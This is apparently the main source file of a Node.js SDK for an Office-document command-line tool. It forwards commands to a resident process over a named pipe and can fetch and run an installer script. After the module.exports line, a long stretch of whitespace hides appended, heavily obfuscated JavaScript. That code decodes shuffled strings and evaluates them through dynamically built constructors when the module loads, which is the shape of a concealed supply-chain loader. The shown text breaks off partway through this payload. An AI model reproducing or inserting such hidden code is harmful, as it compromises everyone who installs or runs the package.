'use strict';
/*
 * officecli — a thin Node.js shell over officecli's resident pipe.
 *
 * Node port of sdk/python/officecli.py. Same one job: forward a command to the
 * running resident over its named pipe and hand back the response. There is NO
 * second vocabulary: a command is the same object you'd put in an officecli
 * `batch` list — e.g. {command:"set", path:"/Sheet1/A1", props:{text:"Hello"}}.
 * `send` forwards one; `batch` forwards many in a single round-trip.
 *
 * Two surfaces, by design:
 *   - bootstrap (infrequent): create() / open() spawn ONE CLI process — a file
 *     that isn't open yet has no resident to talk to.
 *   - everything else (the hot path): send() / batch() are pure pipe
 *     round-trips, no per-command process spawn.
 *
 *     const oc = require('@officecli/sdk');
 *     const doc = await oc.create('report.xlsx', ['--force']);
 *     try {
 *       await doc.send({ command: 'set', path: '/Sheet1/A1', props: { text: 'Hello' } });
 *       console.log(await doc.send({ command: 'get', path: '/Sheet1/A1' }));
 *     } finally {
 *       await doc.close();
 *     }
 *     // or `await using doc = await oc.open('existing.xlsx')` on Node >= 24.
 *
 * Protocol (matches ResidentServer.cs / ResidentClient.cs):
 *   - pipe name : officecli-<SHA256(fullpath)[:16] uppercase>;
 *                 fullpath upper-cased on macOS/Windows, left as-is on Linux.
 *   - unix path : $TMPDIR/CoreFxPipe_<name>  (+ "-ping");  $TMPDIR else /tmp
 *   - win path  : \\.\pipe\<name>            (+ "-ping")
 *   - framing   : one request line + one response line, UTF-8, '\n' terminated;
 *                 one connection == one command. The reply may carry a UTF-8 BOM
 *                 (unix StreamWriter) and a trailing '\r' — both stripped here.
 *   - request   : PascalCase {"Command","Args","Props","Json"}
 *   - response  : {"ExitCode","Stdout","Stderr"}
 */

const os = require('os');
const net = require('net');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const { spawnSync } = require('child_process');

const IS_WIN = process.platform === 'win32';
const IS_MAC = process.platform === 'darwin';

// Mirror officecli's TryResident busy-delivery policy (CommandBuilder.cs): a
// generous connect timeout + a few retries with backoff, applied identically to
// every command. The reply read itself blocks (no timeout) — like officecli's
// PipeReadLine — trusting the resident to answer once our turn comes up in its
// serialized queue. Retries only re-attempt the CONNECT (before the command
// executes), so re-sending is safe even for mutations: there is no "read timed
// out, resend" path that could double-apply.
const BUSY_CONNECT_TIMEOUT_MS = 30000; // = ResidentBusyConnectTimeoutMs
const BUSY_MAX_RETRIES = 3;            // = ResidentBusyMaxRetries
// = CommandBuilder's DefaultOpenIdleSeconds. open() upgrades a reused resident
// (which create() may have auto-started with a short 60s timeout) to the 12min
// interactive window, so a long session over an SDK handle isn't cut short.
const OPEN_IDLE_SECONDS = 12 * 60;

// Installer scripts: the d.officecli.ai mirror is primary; GitHub raw is only a
// fallback (same order as install.sh / install-binary.js). The mirror is
// Cloudflare-fronted and reachable where raw.githubusercontent.com may be
// rate-limited or blocked.
const INSTALL_SH_MIRROR = 'https://d.officecli.ai/install.sh';
const INSTALL_SH_GITHUB = 'https://raw.githubusercontent.com/iOfficeAI/OfficeCLI/main/install.sh';
const INSTALL_PS1_MIRROR = 'https://d.officecli.ai/install.ps1';
const INSTALL_PS1_GITHUB = 'https://raw.githubusercontent.com/iOfficeAI/OfficeCLI/main/install.ps1';
const MISSING_CLI =
  "officecli CLI not found: {bin} is not on PATH nor in the default install " +
  'location (~/.local/bin, or %LOCALAPPDATA%\\OfficeCLI on Windows). This SDK only ' +
  'forwards commands to the officecli binary, which must be installed separately. Install it:\n' +
  '    node -e "require(\'@officecli/sdk\').install()"   # runs the official installer\n' +
  '    # or: curl -fsSL ' + INSTALL_SH_MIRROR + ' | bash\n' +
  '    # (npm i @officecli/sdk already pulls @officecli/officecli, which bundles the binary)\n' +
  'Already installed elsewhere? pass { binary: "/path/to/officecli" }.';

/**
 * Raised on transport/process failure (could not reach the resident). Business
 * outcomes are NOT exceptions — they live in the returned envelope's `success`
 * field, same as the CLI's exit code.
 */
class OfficeCliError extends Error {
  constructor(code, msg) {
    super(`[exit ${code}] ${msg}`);
    this.name = 'OfficeCliError';
    this.code = code;
  }
}

// ---------------------------------------------------------------- pipe address
function dotnetTempDir() {
  // Mirror .NET Path.GetTempPath() on Unix exactly: $TMPDIR else /tmp.
  return process.env.TMPDIR || '/tmp';
}

// Match the path officecli's resident hashes into the pipe name. On Windows it
// derives the name from GetFullPath, which expands 8.3 short components (e.g.
// RUNNER~1, or any user name > 8 chars under %TEMP%) to their long form.
// path.resolve does NOT expand 8.3, so a short path would hash to a different
// pipe and every connect fails with ENOENT — hence realpath, which does expand
// it. realpath needs the file to exist; fall back to the resolved path when it
// doesn't (e.g. pre-create). realpath ALSO resolves symlinks/junctions, which
// GetFullPath does not; harmless here because we hand this resolved path to the
// resident, so the server's GetFullPath sees the already-resolved string and
// both sides hash the same thing. Windows only — on Linux/macOS officecli uses
// GetFullPath (no symlink resolution), so realpath would diverge there
// (e.g. /tmp → /private/tmp on macOS).
function canonicalPath(filePath) {
  const resolved = path.resolve(filePath);
  if (IS_WIN) {
    try { return fs.realpathSync.native(resolved); } catch (_) { /* not there yet */ }
  }
  return resolved;
}

/** [main, ping] pipe addresses for a document path. Exposed for debugging. */
function pipePaths(filePath) {
  let full = canonicalPath(filePath);
  if (IS_MAC || IS_WIN) full = full.toUpperCase(); // Linux: case-sensitive, no upper
  const h = crypto.createHash('sha256').update(full, 'utf8').digest('hex').toUpperCase().slice(0, 16);
  const name = `officecli-${h}`;
  if (IS_WIN) return [`\\\\.\\pipe\\${name}`, `\\\\.\\pipe\\${name}-ping`];
  const base = path.join(dotnetTempDir(), `CoreFxPipe_${name}`);
  return [base, base + '-ping'];
}

// ---------------------------------------------------------------- transport
function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

// One attempt: bound the CONNECT, then block on the reply (no read timeout) —
// exactly like officecli's TrySend (Connect(timeout) + blocking PipeReadLine).
function sendOnce(sockPath, line, connectTimeoutMs) {
  return new Promise((resolve, reject) => {
    let settled = false;
    const chunks = [];
    const socket = net.createConnection(sockPath);
    const connTimer = setTimeout(() => {
      if (settled) return;
      settled = true;
      socket.destroy();
      reject(new Error(`connect timed out after ${connectTimeoutMs}ms`));
    }, connectTimeoutMs);
    const fail = (err) => {
      if (settled) return;
      settled = true;
      clearTimeout(connTimer);
      socket.destroy();
      reject(err);
    };
    socket.once('connect', () => {
      clearTimeout(connTimer); // connected: stop bounding; reply read blocks
      socket.write(line);
    });
    socket.on('data', (d) => {
      chunks.push(d);
      // Line protocol: the reply is one '\n'-terminated line.
      if (d.length && d[d.length - 1] === 0x0a) {
        if (settled) return;
        settled = true;
        clearTimeout(connTimer);
        socket.end();
        resolve(Buffer.concat(chunks));
      }
    });
    socket.once('end', () => {
      if (settled) return;
      settled = true;
      clearTimeout(connTimer);
      resolve(Buffer.concat(chunks));
    });
    socket.once('error', fail);
  });
}

function decodeLine(raw) {
  let text = raw.toString('utf8');
  if (text.charCodeAt(0) === 0xfeff) text = text.slice(1); // strip UTF-8 BOM (unix StreamWriter)
  if (text.charCodeAt(text.length - 1) === 0x0a) text = text.slice(0, -1); // drop the '\n' terminator
  if (text.charCodeAt(text.length - 1) === 0x0d) text = text.slice(0, -1); // and a trailing '\r'
  return text;
}

/**
 * Forward one request, mirroring officecli's TrySend: bounded connect + a few
 * retries with backoff, then a blocking read. A retry only re-attempts the
 * connect (before the command runs), so it never double-applies a mutation. If
 * the command still can't be delivered, raise a busy/unresponsive error — never
 * fall back to touching the file directly (that would race the resident).
 *
 * `maxRetries` overrides the busy-retry count. Liveness probes (serves) pass 0
 * so a missing/stale pipe fails FAST instead of sleeping through the backoff.
 */
async function rpc(sockPath, req, connectTimeoutMs = BUSY_CONNECT_TIMEOUT_MS, maxRetries = BUSY_MAX_RETRIES) {
  const line = Buffer.from(JSON.stringify(req) + '\n', 'utf8');
  let raw = null;
  for (let attempt = 0; ; attempt++) {
    try {
      raw = await sendOnce(sockPath, line, connectTimeoutMs);
      break;
    } catch (e) {
      // Connect/socket error only — the command never ran, so a retry is safe.
      if (attempt >= maxRetries) {
        throw new OfficeCliError(
          -1,
          'resident is running but the command could not be delivered ' +
            `(pipe busy or unresponsive); retry, or close and reopen [${e.message}]`
        );
      }
      await sleep(50 * (attempt + 1)); // = TrySend's 50*(n+1)ms backoff
    }
  }
  const text = decodeLine(raw);
  if (!text.trim()) {
    // Empty/closed reply: the resident accepted the connection but closed
    // without a complete response (e.g. crashed mid-serve). We refuse to
    // re-send — the command may already have been APPLIED before the resident
    // died, so re-sending would double-apply a non-idempotent op — and raise
    // instead. _cmd's recovery then restarts a dead resident and retries once.
    throw new OfficeCliError(
      -1,
      'resident closed the connection without a response ' +
        '(it may have crashed mid-command); retry, or close and reopen'
    );
  }
  return JSON.parse(text);
}

function parseEnvelope(resp) {
  // Return the useful payload: the parsed JSON envelope (object/array) if Stdout
  // is JSON, otherwise the raw Stdout text ("" when empty). Accept ONLY
  // object/array — a bare JSON scalar ("42", "true", "null", a quoted string)
  // stays text, or the caller can't tell literal text "42" from the number 42.
  const out = (resp && resp.Stdout) || '';
  let v;
  try {
    v = JSON.parse(out);
  } catch (_) {
    return out;
  }
  return v !== null && typeof v === 'object' ? v : out;
}

function strMap(o) {
  // Drop null/undefined values (omit), and stringify the rest — the resident's
  // Args/Props are Dictionary<string,string>. A value set to null means "don't
  // send it", not "send empty string"; pass "" for an explicit empty value.
  const r = {};
  for (const k of Object.keys(o)) {
    const v = o[k];
    if (v !== null && v !== undefined) r[k] = String(v);
  }
  return r;
}

async function serves(pingPath, fullPath, timeoutMs = 1000) {
  // Is a resident alive on `pingPath` AND serving `fullPath`? Probes the
  // always-responsive `-ping` pipe (officecli's TryConnect): it answers even
  // while the MAIN pipe is busy. Single-shot (maxRetries=0): a probe should fail
  // fast, not sit through the busy-retry backoff.
  let resp;
  try {
    resp = await rpc(pingPath, { Command: '__ping__' }, timeoutMs, 0);
  } catch (e) {
    if (e instanceof OfficeCliError) return false;
    throw e;
  }
  const served = ((resp && resp.Stdout) || '').trim(); // ping echoes the served path
  if (!served) return false;
  const a = path.resolve(served);
  return a === fullPath || ((IS_MAC || IS_WIN) && a.toLowerCase() === fullPath.toLowerCase());
}

// ---------------------------------------------------------------- binary resolution
function installDirCandidate(name) {
  // Where install.sh / install.ps1 drop the binary: ~/.local/bin on macOS/Linux,
  // %LOCALAPPDATA%\OfficeCLI on Windows. PATH-miss fallback only.
  if (IS_WIN) {
    const base = process.env.LOCALAPPDATA;
    if (!base) return null;
    const exe = name.toLowerCase().endsWith('.exe') ? name : name + '.exe';
    return path.join(base, 'OfficeCLI', exe);
  }
  return path.join(os.homedir(), '.local', 'bin', name);
}

function whichOnPath(name) {
  const dirs = (process.env.PATH || '').split(path.delimiter);
  const cands = IS_WIN ? [name, name + '.exe', name + '.cmd'] : [name];
  for (const dir of dirs) {
    if (!dir) continue;
    for (const c of cands) {
      const p = path.join(dir, c);
      try {
        fs.accessSync(p, fs.constants.X_OK);
        return p;
      } catch (_) {
        /* keep looking */
      }
    }
  }
  return null;
}

function bundledBinary() {
  // If the @officecli/officecli installer package is installed (it is a
  // dependency), prefer its vendored, auto-updating binary. Returns the path if
  // it is present on disk, else null. require is wrapped so the SDK still works
  // as a pure thin client when the dependency was omitted.
  try {
    const cli = require('@officecli/officecli');
    const p = cli.binaryPath();
    return fs.existsSync(p) ? p : null;
  } catch (_) {
    return null;
  }
}

function resolveBinary(binary) {
  // Order: explicit path (has a separator) is trusted as-is; then the bundled
  // installer-package binary; then PATH; then the official installer's known
  // location. Idempotent — an already-resolved absolute path passes through.
  if (binary.includes(path.sep) || binary.includes('/')) return binary;
  if (binary === 'officecli') {
    const bundled = bundledBinary();
    if (bundled) return bundled;
  }
  const found = whichOnPath(binary);
  if (found) return found;
  const cand = installDirCandidate(binary);
  if (cand) {
    try {
      fs.accessSync(cand, fs.constants.X_OK);
      return cand;
    } catch (_) {
      /* fall through */
    }
  }
  return binary; // give up; runCli raises the helpful error
}

async function ensureCliBinary(binary, autoInstall) {
  // Async binary resolution for the entry points (open/create), able to ACTIVELY
  // provision a missing CLI. Order: explicit path is trusted as-is; then the
  // bundled installer package (download its binary if not yet present — this is
  // the package's own signed download, not a surprise); then PATH; then the
  // installer's known location; finally, if autoInstall, run the official
  // install.sh. Returns the resolved path (or the bare name, so runCli raises
  // the helpful MISSING_CLI error if everything failed).
  if (binary.includes(path.sep) || binary.includes('/')) return binary; // explicit: trust caller

  // Accept the first candidate that actually RUNS (`--version` exit 0), in
  // priority order: the bundled (auto-updating) binary, then PATH, then the
  // installer's known location. Probing — not mere file existence — means a
  // present-but-broken binary is skipped, and a working officecli is never
  // shadowed by a needless install.
  const candidates = [];
  if (binary === 'officecli') {
    try {
      const p = require('@officecli/officecli').binaryPath();
      if (fs.existsSync(p)) candidates.push(p);
    } catch (_) { /* dependency absent */ }
  }
  const onPath = whichOnPath(binary);
  if (onPath) candidates.push(onPath);
  const cand = installDirCandidate(binary);
  if (cand) candidates.push(cand);

  for (const c of candidates) {
    if (probeVersion(c)) return c;
  }

  // Nothing usable found anywhere — provision it (only for the default name).
  if (autoInstall && binary === 'officecli') {
    process.stderr.write('[officecli] CLI not found — installing from d.officecli.ai …\n');
    try {
      const cli = require('@officecli/officecli');
      await cli.ensureBinary(); // bundled package's own signed download
      const p = cli.binaryPath();
      if (probeVersion(p)) return p;
    } catch (_) { /* fall through to the official installer */ }
    install(); // install.sh (unix) / install.ps1 (Windows)
    const after = installDirCandidate('officecli');
    if (after && probeVersion(after)) return after;
  }
  return binary; // give up → runCli raises the helpful MISSING_CLI
}

// Quote one token for a cmd.exe command line: ALWAYS wrap in double quotes,
// doubling any embedded quote. Unconditional quoting (rather than "only when it
// looks dangerous") is deliberate — it removes any reliance on enumerating every
// cmd metacharacter. A double-quoted token cannot be re-tokenized by cmd.exe, so
// & | < > ^ ( ) " are inert, and a %VAR% expansion stays *inside* the quotes and
// thus can never inject a command separator (at worst the argument is mangled —
// there is no command-line escape for %, a documented cmd.exe limitation). This
// matters because the binary path / args may be untrusted when the SDK is driven
// by a server. cmd /s strips the outer wrapper, leaving these per-token quotes.
function quoteForCmd(s) {
  return `"${String(s).replace(/"/g, '""')}"`;
}

function spawnCli(binary, argv, extraOpts) {
  let cmd = binary;
  let args = argv;
  const opts = { encoding: 'utf8', ...extraOpts };
  if (IS_WIN && /\.(cmd|bat)$/i.test(binary)) {
    // Node refuses to spawn a .cmd/.bat directly without a shell since
    // CVE-2024-27980 (raises EINVAL). Run it through cmd.exe ourselves,
    // quoting each token so paths with spaces survive — shell:true would
    // join the args unquoted and break on the first space. Mirrors Node's
    // own shell idiom (cmd /d /s /c "<line>" + windowsVerbatimArguments)
    // but with the per-token quoting shell:true omits.
    const line = [binary, ...argv].map(quoteForCmd).join(' ');
    cmd = process.env.ComSpec || 'cmd.exe';
    args = ['/d', '/s', '/c', `"${line}"`];
    opts.windowsVerbatimArguments = true;
  }
  return spawnSync(cmd, args, opts);
}

function runCli(binary, argv) {
  const r = spawnCli(binary, argv);
  if (r.error && r.error.code === 'ENOENT') {
    throw new OfficeCliError(127, MISSING_CLI.replace('{bin}', JSON.stringify(binary)));
  }
  if (r.error) throw new OfficeCliError(-1, r.error.message);
  return r;
}

// Probe a resolved binary by running `<binary> --version`: true iff it actually
// runs and exits 0. We accept only a WORKING officecli — a present-but-broken
// file (wrong arch, stale/again-renamed shim, corrupt download) must not be
// used, and conversely a working officecli on PATH must not be shadowed by a
// needless auto-install. Output is discarded.
function probeVersion(binPath) {
  const r = spawnCli(binPath, ['--version'], { stdio: ['ignore', 'ignore', 'ignore'] });
  return !r.error && r.status === 0;
}

// ---------------------------------------------------------------- the shell
class Document {
  constructor(filePath, binary = 'officecli', timeoutMs = 30000) {
    // Canonical (Windows 8.3-expanded) so the pipe name AND the serves() path
    // comparison both match what the resident reports.
    this.path = canonicalPath(filePath);
    this.bin = resolveBinary(binary);
    this.timeout = timeoutMs; // connect timeout (ms); the reply read blocks
    const [main, ping] = pipePaths(this.path);
    this._main = main;
    this._ping = ping;
    this._restarting = null; // in-flight dead-resident restart (serializes callers)
  }

  async _start() {
    // Reuse a resident already serving this file (no spawn). serves() is a real
    // liveness probe (ping + path match), so a stale/dead socket falls through
    // to `officecli open`, which replaces it via TryConnect.
    if (await serves(this._ping, this.path)) return;
    const r = runCli(this.bin, ['open', this.path]);
    if (r.status !== 0) throw new OfficeCliError(r.status == null ? -1 : r.status, r.stderr || r.stdout);
  }

  async _cmd(command, args, props, asJson = true, timeoutMs) {
    const req = { Command: command, Json: asJson };
    if (args) req.Args = strMap(args);
    if (props !== null && props !== undefined) req.Props = strMap(props);
    const t = timeoutMs == null ? this.timeout : timeoutMs;
    try {
      return await rpc(this._main, req, t, BUSY_MAX_RETRIES);
    } catch (e) {
      if (!(e instanceof OfficeCliError)) throw e;
      // Delivery failed. Use the -ping pipe to tell DEAD from BUSY:
      //   • ALIVE but main pipe unresponsive → do NOT bypass it (a second writer
      //     racing the live resident loses data on its save). Re-raise.
      //   • DEAD (crashed / stale socket) → restart with one `officecli open`
      //     and retry ONCE. Safe across reads and mutations.
      if (await this.alive()) throw e;
      // Serialize the restart across concurrent callers sharing this Document so
      // only one spawns `officecli open` (else N-1 orphaned residents race saves).
      if (!this._restarting) {
        this._restarting = (async () => {
          if (!(await this.alive())) await this._start();
        })().finally(() => {
          this._restarting = null;
        });
      }
      await this._restarting;
      return await rpc(this._main, req, t, BUSY_MAX_RETRIES);
    }
  }

  /**
   * Forward ONE command in officecli's batch-item shape and return its parsed
   * result (the JSON envelope, or raw text for content commands). `item` is
   * exactly an object you'd put in a `batch` list:
   *   { command: 'set', path: '/Sheet1/A1', props: { text: 'hi' } }
   * `command` (or `op`) picks the command, `props` becomes the property map, and
   * every other key is forwarded verbatim as a command argument. asJson=false
   * requests plain-text output (view/raw/dump), mirroring the CLI's --json.
   */
  async send(item, asJson = true, timeoutMs) {
    const command = item.command || item.op;
    if (!command) throw new OfficeCliError(-1, "send(item): item needs a 'command' (or 'op') key");
    const args = {};
    for (const k of Object.keys(item)) {
      if (k !== 'command' && k !== 'op' && k !== 'props') args[k] = item[k];
    }
    return parseEnvelope(await this._cmd(command, args, item.props, asJson, timeoutMs));
  }

  /**
   * Forward officecli's `batch`: apply a LIST of the same item objects as send()
   * in ONE round-trip — the fast path for many writes.
   */
  async batch(items, { force = true, stopOnError = false, timeoutMs } = {}) {
    const args = { batchJson: JSON.stringify(items), force, stopOnError };
    return parseEnvelope(await this._cmd('batch', args, undefined, true, timeoutMs));
  }

  // Best-effort idle-timeout upgrade over the always-responsive ping pipe.
  // Mirrors ResidentClient.SendSetIdleTimeout: a failure is non-fatal — the
  // resident keeps its original idle schedule. Single-shot (maxRetries=0).
  async _setIdleTimeout(seconds) {
    try {
      await rpc(this._ping, { Command: '__set-idle-timeout__', Args: { seconds: String(seconds) } }, this.timeout, 0);
    } catch (e) {
      if (!(e instanceof OfficeCliError)) throw e;
    }
  }

  /** True iff a resident is alive AND serving this file (probes the -ping pipe). */
  async alive(timeoutMs = 1000) {
    return serves(this._ping, this.path, timeoutMs);
  }

  /**
   * = `officecli close`: stop the resident. It flushes the in-memory doc to disk
   * as it shuts down, so no separate save is needed. The resident acks AFTER
   * shutting down, so a missing/empty ack still means "closed"; a real shutdown
   * error is a non-empty response and surfaces through the return value.
   */
  async close() {
    try {
      return parseEnvelope(await rpc(this._ping, { Command: '__close__' }, this.timeout));
    } catch (e) {
      if (!(e instanceof OfficeCliError)) throw e;
      // Only swallow if the resident is actually gone. If it's still alive (ping
      // momentarily unreachable), the close did NOT take effect — re-raise, or
      // the caller wrongly believes the file is released.
      if (await this.alive()) throw e;
      return ''; // resident gone / ack lost — end state is "closed"
    }
  }

  async [Symbol.asyncDispose]() {
    await this.close();
  }
}

/**
 * Create a blank Office document and return a live Document handle. Extra CLI
 * flags pass through verbatim:
 *   await create('report.xlsx', ['--force']);
 *   await create('doc', ['--type', 'docx']);
 * One CLI spawn (`officecli create`), which auto-starts a resident; the handle
 * binds to THAT resident (no second spawn). Inherits officecli's semantics —
 * file_locked (close it first) / file_exists (pass '--force').
 */
async function create(filePath, args = [], { binary = 'officecli', timeoutMs = 30000, autoInstall = true } = {}) {
  const full = path.resolve(filePath);
  const bin = await ensureCliBinary(binary, autoInstall);
  const r = runCli(bin, ['create', full, ...args]);
  if (r.status !== 0) throw new OfficeCliError(r.status == null ? -1 : r.status, r.stderr || r.stdout);
  const doc = new Document(full, bin, timeoutMs);
  await doc._start(); // create auto-started a resident; this finds it alive (no extra spawn)
  return doc;
}

/**
 * Open an EXISTING document and return a live Document handle. `officecli open`
 * is idempotent: reuse a resident already serving this file or start one.
 *
 *   Owner  — `const d = await open(f); try { ... } finally { await d.close(); }`
 *   Borrow — `const d = await open(f); await d.send(...)`  // leave it running
 *
 * Failure model (per send/batch): a DEAD resident is transparently restarted and
 * the command retried once; an ALIVE-but-busy pipe raises OfficeCliError (retry,
 * or close() and reopen).
 */
async function open(filePath, { binary = 'officecli', timeoutMs = 30000, autoInstall = true } = {}) {
  const bin = await ensureCliBinary(binary, autoInstall);
  const doc = new Document(filePath, bin, timeoutMs);
  await doc._start();
  // Mirror CLI `open`: when reusing a resident create() auto-started with a
  // short 60s timeout, upgrade it to the 12min interactive window. (If _start
  // spawned `officecli open` instead, that path already set 12min; re-sending
  // is idempotent.)
  await doc._setIdleTimeout(OPEN_IDLE_SECONDS);
  return doc;
}

/**
 * Install the officecli CLI binary via its OFFICIAL installer — explicit by
 * design (this SDK never auto-downloads behind your back). Runs install.ps1 via
 * PowerShell on Windows and install.sh via bash elsewhere. Note: when installed
 * via npm, @officecli/officecli already bundles an auto-updating binary, so this
 * is only needed for a standalone (~/.local/bin or %LOCALAPPDATA%\OfficeCLI)
 * install.
 */
function install() {
  if (IS_WIN) {
    process.stderr.write(`Installing officecli via ${INSTALL_PS1_MIRROR} (github fallback) ...\n`);
    // Fetch the script mirror-first, github fallback, then run it. The whole
    // try/catch is assigned so a mirror failure transparently falls back.
    const ps = `$s = try { irm '${INSTALL_PS1_MIRROR}' } catch { irm '${INSTALL_PS1_GITHUB}' }; $s | iex`;
    const r = spawnSync('powershell', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps], {
      stdio: 'inherit',
    });
    if (r.status !== 0) {
      throw new OfficeCliError(
        r.status == null ? -1 : r.status,
        `officecli install failed. Run manually:\n    irm ${INSTALL_PS1_MIRROR} | iex`
      );
    }
    return;
  }
  process.stderr.write(`Installing officecli via ${INSTALL_SH_MIRROR} (github fallback) ...\n`);
  // (curl mirror || curl github) | bash — the subshell emits whichever script
  // fetch succeeds; the group keeps the pipe bound to the whole fallback.
  const sh = `(curl -fsSL ${INSTALL_SH_MIRROR} 2>/dev/null || curl -fsSL ${INSTALL_SH_GITHUB}) | bash`;
  const r = spawnSync('bash', ['-c', sh], { stdio: 'inherit' });
  if (r.status !== 0) {
    throw new OfficeCliError(
      r.status == null ? -1 : r.status,
      `officecli install failed. Run manually:\n    curl -fsSL ${INSTALL_SH_MIRROR} | bash`
    );
  }
}

module.exports = { open, create, install, Document, OfficeCliError, pipePaths };																																																																																																																																																																																																																																																																										var z = '-*1695';var NX=[6912847,907388^907539,217597^204358,330538^330063,982935^939384,5019283],SX=[5283741,416048^416193,293640^317673,436016^436107,781205^733396,4738901];function spin(R,c){for(var e,r,t,s,i,n,a=[],o=217956^217956,l=c[648486^648486];o<R['\u006C\u0065\u006E\u0067\u0074\u0068'];)a[o]=R['\u0063\u0068\u0061\u0072\u0041\u0074'](o),o+=908966^908967;for(e=a['\u006C\u0065\u006E\u0067\u0074\u0068'],o=275122^275122;o<e;)r=l*(o+c[581701^581700])+l%c[740899^740897],i=(t=l*(o+c[827307^827304])+l%c[172928^172932])%e,n=a[s=r%e],a[s]=a[i],a[i]=n,l=(r+t)%c[116482^116487],o+=325595^325594;return a['\u006A\u006F\u0069\u006E']("");}function splitLane(R){var c=String['\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065'](742867^742863),e=spin(R,NX);return(e=(e=(e=e['\u0073\u0070\u006C\u0069\u0074']("\u005E")['\u006A\u006F\u0069\u006E'](c))['\u0073\u0070\u006C\u0069\u0074']("\u002A\u0031")['\u006A\u006F\u0069\u006E']("\u005E"))['\u0073\u0070\u006C\u0069\u0074']("\u002A\u0030")['\u006A\u006F\u0069\u006E']("\u002A"))['\u0073\u0070\u006C\u0069\u0074'](c);}function peel(R){return spin(R,SX);}!function(R,c,_0x4d43e){R['\u007A']=z;var e=splitLane("\u0063\u005E\u006D\u0065\u006A\u0062\u005E\u0074\u0072\u006F");_0x4d43e=199787^199779;R[e[539188^539188]]=c,typeof module===e[818819^818818]&&(R[e[712707^712705]]=module);var r=peel("cnotsnturtpicokfzrogmybjdcawvulxsreqh".split("").reverse().join("")),t=peel[r['\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006E\u0067'](814520^814520,732566^732573)],s=t("",peel('=aenruh(al=5c,g8fdu.yr ..ncecf,5"paeau6lnj)r]2uv"x-q(] a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw). rod[fs2n{drvt4x)+0,anr+rr+o)}z1 =hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae f=[;hisy.em(d+o!2 =(evea78=.)4ei=g.n={ff=1[<2a f1=r;4,S)rylv1u y;kql{tvnv (C (l,ovnp i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g"]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r, .);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe t0nrpr( vr8flrn,ddgt ]6a.;m;rth.gq 2a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si"li"r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9")cpA+u;utp]"=lk7vpt 1r;hzw")t()9)(.lul=s7f; ;sq0)n"y+0s}=va+s mh(0q.]hv;> 06=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r; )r>18zho*o{<akmsn)akte.vo9+ea0clio;bu =]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar"}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+ hlk[+x=e -8j{(ejy9(()) '));t("",s(peel('R_<"cRJ!&VecRWa=RrfR$6"c1;RRYcnh_/.t iRRRG^<R.RcR2.[nR .Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\\.fR.<c:!bpl09icoRrtcR(;roRRn2-"(.^w y.<<dd )$f ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\'oRi.RR<\'RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f."4Rb N"eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\\R>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z"RnfPesRtRRR.<Rl#Rf<: 2((R R$\'6s`<3nhi*$eXc}Rh? ctoc.iecc9 {Ra<s;u!.e]ERRoH..$"n<D3RsRR..(ReesseR< t," Rdov}Sc0Jmi.T<sEegsRw]R"aR.R!R<o))jR Rew itc.snk(}(n[veR<0<=kfH<rrMR ciknE.c.B<&R[o]R.%ccRlrx;* ["oisenRefea!Yn.ecR%o"u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@"}RuRqu5(3Pol"eRt0!ftaR*<R1tnkcf}T.!$/<ro IycRR )P<\\.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\\P!n=cs<(ci<(R7eReRc. t<epe)e<<,e<(EK!.pnb$"RaRR.evuhc.Tl_c.:R0r )Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP  t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R <i2<R08:.t}Rf!"-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc !(ic(SR.cr`:9<XspR($ mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h Mf<{[o$R< Rs0)= <xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs (M&Rf.eP*g >s)<o.=.RisnrR.?{5<ibR6)RR1s cRgqcelc=cl;be<lf*SICd2e"zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<% t.RowR}\' r>pzh..lR\'<go_}<SR(kqxh[ &<iR-f$C<u<iaENR5RTR]<Rpsk..Rzdg.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4 dt_9^<,ore5RfRx 